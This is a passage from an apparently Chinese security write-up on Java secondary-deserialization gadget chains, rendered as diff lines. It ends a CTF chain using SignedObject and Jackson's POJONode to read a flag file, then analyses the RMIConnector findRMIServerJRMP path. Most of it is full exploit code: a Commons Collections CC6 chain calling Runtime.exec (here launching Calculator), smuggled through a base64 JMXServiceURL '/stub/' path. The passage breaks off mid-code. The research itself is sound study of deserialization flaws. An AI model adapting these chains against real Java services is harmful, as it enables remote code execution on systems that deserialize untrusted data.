+        <span class="n">URLHelper</span> <span class="n">urlHelper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLHelper</span><span class="o">(</span><span class="s">"File:///flag"</span><span class="o">);</span>
+        <span class="n">urlHelper</span><span class="o">.</span><span class="na">visiter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLVisiter</span><span class="o">();</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">urlHelper</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>
+        <span class="n">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>
+
+        <span class="n">POJONode</span> <span class="n">node</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">signedObject</span><span class="o">);</span>
+        <span class="n">BadAttributeValueExpException</span> <span class="n">val</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">val</span><span class="o">,</span> <span class="s">"val"</span><span class="o">,</span> <span class="n">node</span><span class="o">);</span>
+
+        <span class="n">ser</span><span class="o">(</span><span class="n">val</span><span class="o">);</span>
+
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">ser</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">val</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">dField</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
+        <span class="n">dField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">dField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">val</span><span class="o">);</span>
+    <span class="o">}</span>
+
+
+<span class="o">}</span>
+</pre></div>
+<p>再次访问下file即可得到flag</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195853-9433ea52-d567-1.png"/></p>
+<h1 data-content="1" id="c1160e79b5add3b7768c238ec3d8c973">RMIConnector</h1>
+<h3 data-content="1" id="3491e6a1526c9d6d6fde02591e3b0b14">利用链</h3>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">nvokerTransform#transform() -&gt; RMIConnector#connect() -&gt;&gt; RMIConnector#findRMIServerJRMP()</span>
+</pre></div>
+<h3 data-content="1" id="ea30993f79e3a6f11cfdcde01eb91944">利用链分析</h3>
+<h4 data-content="1" id="5d557bca78c6539676547aa03470b174">
+<code>RMIConnector#findRMIServerJRMP()</code>​</h4>
+<p>在该方法中，将base64字符串解码后以序列化流的形式进行反序列化操作，如果能控制base64参数即可造成二次反序列化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195916-a1a48840-d567-1.png"/></p>
+<p>网上寻找，找到同文件的<code>findRMIServer</code>​方法有调用，且判断path的开头必须为/stub/并截取的path后的值，所以path为我们base64序列化字符串的传入点。而path通过getURLPath获取，也就是下面urlPath属性的值，所以这里我们的思路就是通过反射修改urlPath属性的值，为/stub/base64_ser_str的形式</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195927-a82224a2-d567-1.png"/></p>
+<p>再往上跟找到<code>connect()</code>​方法</p>
+<h4 data-content="1" id="c2c37b03c7c48b486b81e410fa2d6cfe">​<code>RMIConnector#connect()</code>​​</h4>
+<p>发现是一个public的connect方法调用了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195941-b097b5a2-d567-1.png"/></p>
+<p>那么现在就2个思路</p>
+<ol>
+<li>谁的方法调用了<code>connect</code>​方法并且传入的值可控，然后一直往上跟readobject或者tostring或者getter方法</li>
+<li>谁的反射可控，直接进行反射调用</li>
+</ol>
+<p>那么现在先写一个本地的直接反射调用的demo来触发二次反序列化</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIconnector</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.remote.JMXServiceURL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.remote.rmi.RMIConnector</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6_t</span> <span class="o">{</span>
+
+
+
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})}</span> <span class="o">;</span>
+
+        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantFactory</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+
+
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="s">"aa"</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">"bbb"</span><span class="o">);</span>
+        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aa"</span><span class="o">);</span>
+
+        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+        <span class="n">Field</span> <span class="n">factoryfield</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
+        <span class="n">factoryfield</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">factoryfield</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">serialize2Base64</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
+        <span class="n">run</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+<span class="c1">//        unserialize("ser.bin");</span>
+
+    <span class="o">}</span>
+
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">serialize2Base64</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">(</span><span class="n">String</span> <span class="n">base64</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">"service:jmx:rmi://"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">"urlPath"</span><span class="o">,</span> <span class="s">"/stub/"</span><span class="o">+</span><span class="n">base64</span><span class="o">);</span>
+        <span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="n">rmiConnector</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
+
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+<p>那么接下来的问题就是如何把这个<code>connect()</code>​方法给利用起来，第一种方法比较难跟，但是第二种方法我们就可以联想到最简单的CC链的<code>InvokerTransformer</code>​来进行任意类任意方法调用，这样子就可以套一层反射来调用<code>connect()</code>​了</p>
+<p>于是就可以写出EXP，通过CC6来进行调用二次反序列化</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIconnector</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.remote.JMXServiceURL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.remote.rmi.RMIConnector</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6_t</span> <span class="o">{</span>
+
+
+
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})}</span> <span class="o">;</span>
+
+        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantFactory</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+
+
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="s">"aa"</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">"bbb"</span><span class="o">);</span>
+        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aa"</span><span class="o">);</span>
+
+        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+        <span class="n">Field</span> <span class="n">factoryfield</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
+        <span class="n">factoryfield</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">factoryfield</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+
+
+
+
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">serialize2Base64</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
+        <span class="n">run</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+<span class="c1">//        unserialize("ser.bin");</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">unserialize</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">ser</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">ser</span><span class="o">));</span>
+        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Unserialize Ok!"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">serialize2Base64</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Serialize Ok!"</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">(</span><span class="n">String</span> <span class="n">base64</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">"service:jmx:rmi://"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">"urlPath"</span><span class="o">,</span> <span class="s">"/stub/"</span><span class="o">+</span><span class="n">base64</span><span class="o">);</span>
+        <span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="n">InvokerTransformer</span> <span class="n">connect</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"connect"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">rmiConnector</span><span class="o">);</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">hashMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">"2"</span><span class="o">);</span>
+        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">rmiConnector</span><span class="o">);</span>
